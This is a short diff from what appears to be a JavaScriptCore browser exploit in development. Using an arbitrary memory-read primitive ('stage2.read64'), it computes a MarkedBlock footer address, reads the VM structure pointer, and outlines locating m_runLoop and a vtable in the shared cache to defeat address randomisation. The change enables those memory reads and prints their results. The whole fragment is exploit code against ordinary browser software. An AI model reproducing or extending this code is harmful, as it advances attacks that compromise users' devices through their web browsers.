@@ -642,11 +642,11 @@ for (var i = 0; i < 1000; ++i) {
         var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
         //refer to VM.h this is
         //JSC::MarkedBlock::footer at 0ffset 8 should be the vm struct
-        //print("footeraddr @ " + footeraddr);
-        //var vmstruct = stage2.readInt64(footeraddr+0x08); 
-        //print("vmstruct @ " + vmstruct);
+        print("footeraddr @ " + footeraddr);
+        var vmstruct = stage2.read64(footeraddr+0x08); 
+        print("vmstruct @ " + vmstruct);
         //var structdump = stage2.read(vmstruct,0x30);
-        //var m_runloop = stage2.readInt64(vmstruct+0x10); 
+        //var m_runloop = stage2.readInt64(vmstruct+0x10); might be 0x20 instead of 0x10
         //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
         //print("m_runloop @ " + m_runloop);
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
